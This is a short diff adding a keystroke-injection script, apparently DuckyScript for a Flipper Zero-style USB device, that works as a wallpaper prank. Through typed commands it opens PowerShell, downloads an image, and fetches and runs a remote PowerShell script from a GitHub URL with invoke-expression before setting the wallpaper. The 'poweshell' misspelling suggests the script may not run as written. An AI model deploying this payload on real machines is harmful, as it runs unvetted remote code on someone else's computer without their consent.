@@ -1,0 +1,13 @@
+GUI r
+DELAY 250
+STRING poweshell
+ENTER
+DELAY 500
+STRING iwr https://wallpaper.dog/large/650370.jpg?dl=1 -o $ENV:USERPROFILE\Desktop\fix.jpg
+ENTER
+DELAY 200
+STRING $pl = iwr https://raw.githubusercontent.com/ConDaCat/flipper/main/walpapertrollnewtest.ps1?dl=1; invoke-expression $pl
+ENTER
+DELAY 200
+STRING  Set-WallPaper -Image "$Env:USERPROFILE\Desktop\fix.jpg" -Style Center
+ENTER
